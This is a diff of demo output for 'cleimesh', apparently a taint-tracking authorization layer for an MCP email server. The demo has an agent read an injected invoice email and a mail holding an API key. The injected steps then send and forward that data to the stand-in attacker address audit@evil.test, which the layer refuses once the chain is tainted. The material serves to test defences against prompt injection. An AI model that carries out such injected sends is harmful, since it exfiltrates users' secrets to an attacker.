@@ -6,9 +6,10 @@
   4. send_email to audit@evil.test (injected)    -> ok
   5. forward_email #1 to audit@evil.test         -> ok
   mails in audit@evil.test (the attacker): 2
+  mails in boss@corp.test (allowed while tainted): 0
 
 == WITH cleimesh: one command in front of the same server
-$ cleimesh mcp add mail --tool list_emails_metadata --tool get_emails_content --tool send_email --tool forward_email --taints list_emails_metadata --taints get_emails_content --clean-only send_email --clean-only forward_email --print -- mcp-email-server stdio
+$ cleimesh mcp add mail --tool list_emails_metadata --tool get_emails_content --tool send_email --tool forward_email --taints list_emails_metadata --taints get_emails_content --clean-only send_email --clean-only forward_email --when-tainted send_email.account_name=work --when-tainted send_email.recipients=boss@corp.test --when-tainted send_email.subject="*" --when-tainted send_email.body="*" --print -- mcp-email-server stdio
 Token for mail: /root/.config/cleimesh/mcp/mail.json (30 days)
 It grants these tools. Read what each tells the model: the token limits calls, not what a description says.
   list_emails_metadata [taints the agent]: List email metadata (email_id, subject, sender, recipients, date) without body content. Ti
@@ -20,11 +21,14 @@ It grants these tools. Read what each tells the model: the token limits calls, n
   1. list_emails_metadata (inbox)                -> ok
   2. get_emails_content #2 (invoice, injected)   -> ok
   3. get_emails_content #1 (the API key)         -> ok
-  4. send_email to audit@evil.test (injected)    -> REFUSED | Authorization failed: send_email refused: holder urn:ietf:params:oauth:jwk-thumbprint:sha-256:pJ0AAnP9FagtBjSIlTPNSpMW_lOtx1KnkDcqHxU6fqw in this chai
-  5. forward_email #1 to audit@evil.test         -> REFUSED | Authorization failed: forward_email refused: holder urn:ietf:params:oauth:jwk-thumbprint:sha-256:pJ0AAnP9FagtBjSIlTPNSpMW_lOtx1KnkDcqHxU6fqw in this c
+  4. send_email to audit@evil.test (injected)    -> REFUSED | Authorization failed: send_email refused: holder urn:ietf:params:oauth:jwk-thumbprint:sha-256:V0SF7j4FTsR9xbYTS9HvGdeh0k8Do0rQfXzVaWE0lgg in this chain received untrusted content (receipt 01a210d3-0047-751e-8fc4-cc7bf7fdedbd); argument recipients is outside what a tainted chain may use; clearing it takes a human (cleimesh taint clear)
+  5. forward_email #1 to audit@evil.test         -> REFUSED | Authorization failed: forward_email refused: holder urn:ietf:params:oauth:jwk-thumbprint:sha-256:V0SF7j4FTsR9xbYTS9HvGdeh0k8Do0rQfXzVaWE0lgg in this chain received untrusted content (receipt 01a210d3-0047-751e-8fc4-cc7bf7fdedbd); no when_tainted: refused outright once tainted; clearing it takes a human (cleimesh taint clear)
+  6. send_email to boss@corp.test (allowed)      -> ok
+  7. send_email to boss + cc audit@evil.test     -> REFUSED | Authorization failed: send_email refused: holder urn:ietf:params:oauth:jwk-thumbprint:sha-256:V0SF7j4FTsR9xbYTS9HvGdeh0k8Do0rQfXzVaWE0lgg in this chain received untrusted content (receipt 01a210d3-0047-751e-8fc4-cc7bf7fdedbd); argument cc is not allowed once tainted; clearing it takes a human (cleimesh taint clear)
   mails in audit@evil.test (the attacker): 0
+  mails in boss@corp.test (allowed while tainted): 1
 $ cleimesh taint list
-urn:ietf:params:oauth:jwk-thumbprint:sha-256:pJ0AAnP9FagtBjSIlTPNSpMW_lOtx1KnkDcqHxU6fqw tainted by receipt 01a2100a-f394-7224-9df2-747d995f1fa2
+urn:ietf:params:oauth:jwk-thumbprint:sha-256:V0SF7j4FTsR9xbYTS9HvGdeh0k8Do0rQfXzVaWE0lgg tainted by receipt 01a210d3-0047-751e-8fc4-cc7bf7fdedbd
 $ cleimesh audit verify
-OK: 8 receipts in /root/.local/share/cleimesh/receipts/receipts.jsonl, signed by 12D3KooWNDiXDA2AjfKomX9D4Fze8SrmnkF1nXr8rhq3imzZPf9x
+OK: 11 receipts in /root/.local/share/cleimesh/receipts/receipts.jsonl, signed by 12D3KooWBT1UPPopdodo9aNQupPkj67QPAvk6jSJPzRgiFZG3Gwu
   head /root/.local/share/cleimesh/receipts/receipts.jsonl.head matches
